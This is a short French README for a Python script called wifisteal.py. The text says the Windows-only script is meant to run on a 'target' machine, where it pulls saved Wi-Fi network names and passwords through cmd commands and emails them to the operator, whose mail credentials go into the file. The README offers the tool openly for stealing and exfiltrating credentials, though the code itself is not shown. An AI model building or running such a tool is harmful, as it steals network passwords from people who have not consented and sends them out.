# wifisteal.py

**Ne marche que sur windows**

Programme à exécuter sur la target. Run les commandes cmd pour voir les réseaux wifi enregistrés ainsi que leurs mdp, puis les envoie par mail.

**Utilisation :**

**Avant de lancer le programme, il faut rentrer votre mail et mot de passe en haut du fichier pour qu'il puisse vous envoyer le mail contenant les mots de passe.

   python3 wifisteal.py
